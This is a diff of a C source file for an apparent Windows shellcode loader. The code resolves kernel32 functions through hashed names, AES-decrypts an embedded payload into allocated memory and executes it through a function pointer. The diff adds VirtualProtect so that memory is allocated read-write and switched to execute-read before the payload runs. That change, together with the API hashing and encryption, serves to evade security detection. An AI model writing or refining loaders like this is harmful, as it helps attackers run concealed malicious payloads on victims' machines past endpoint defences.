@@ -13,6 +13,7 @@
 // The hashed values of strings "KERNEL32.DLL" and "VirtualAlloc"
 #define KERNEL32DLL_HASH 0x367DC15A
 #define VirtualAlloc_HASH 0xF625556A
+#define VirtualProtect_HASH 0xB40194F8
 
 // Implementation of Jenkins one at a time hashing function
 #define INITIAL_SEED 7
@@ -169,13 +170,20 @@ int main() {
 		DWORD flProtect
 	);
 
+	typedef BOOL(WINAPI* fnVirtualProtect) (
+		LPVOID lpAddress,
+		SIZE_T dwSize,
+		DWORD flNewProtect,
+		PDWORD lpflOldProtect
+	);
+
 	// Retrieve the proc address of VirtualAlloc in kernel32.dll. 
 	// We did not have to load kernel32.dll, since the PE loads it at launch anyway
 	HMODULE hKernel32Module = get_module_handle_hash(KERNEL32DLL_HASH);
 	fnVirtualAlloc pVirtualAlloc = get_proc_address_hash(hKernel32Module, VirtualAlloc_HASH);
 
 	// Allocate memory that has read, write, and execute permission.
-    void* executable_memory = pVirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    void* executable_memory = pVirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!executable_memory) {
         printf("VirtualAlloc failed: %d\n", GetLastError());
         return -1;
@@ -186,6 +194,11 @@ int main() {
 
 	// Decrypt the payload in place using AES
 	AES_CBC_decrypt_buffer(&ctx, executable_memory, len);
+
+	fnVirtualProtect pVirtualProtect = get_proc_address_hash(hKernel32Module, VirtualProtect_HASH);
+
+	DWORD old_protect = NULL;
+	pVirtualProtect(executable_memory, len, PAGE_EXECUTE_READ, &old_protect);
 
 	// Run the payload using pointer magic
 	((void(*)()) executable_memory)();
